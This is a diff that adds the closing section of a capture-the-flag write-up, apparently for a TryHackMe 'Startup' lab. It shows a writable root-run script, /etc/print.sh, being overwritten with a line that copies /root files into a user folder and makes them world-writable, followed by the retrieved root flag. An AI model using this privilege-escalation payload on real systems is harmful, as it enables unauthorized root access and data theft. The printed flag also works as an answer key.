@@ -667,4 +667,24 @@ lennie@startup:~/scripts$
 ```
 
 > [!note]
-> This led me to find the print.sh 
+> This led me to find the print.sh file which is writable so uploaded a payload onto this which allowed me to copy root files into lennies folder.
+
+```
+lennie@startup:~/scripts$ cat /etc/print.sh 
+#!/bin/bash
+echo "Done!"
+cp /root/* /home/lennie; chmod 777 /home/lennie/*
+lennie@startup:~/scripts$ 
+```
+> [!note]
+> Waited a minute to get root.txt!
+
+```
+lennie@startup:~$ ls
+Documents  root.txt  scripts  user.txt
+lennie@startup:~$ cat root.txt 
+THM{f963aaa6a430f210222158ae15c3d76d}
+```
+
+![](Obsidian%20assets/Startup%20completed.png)
+
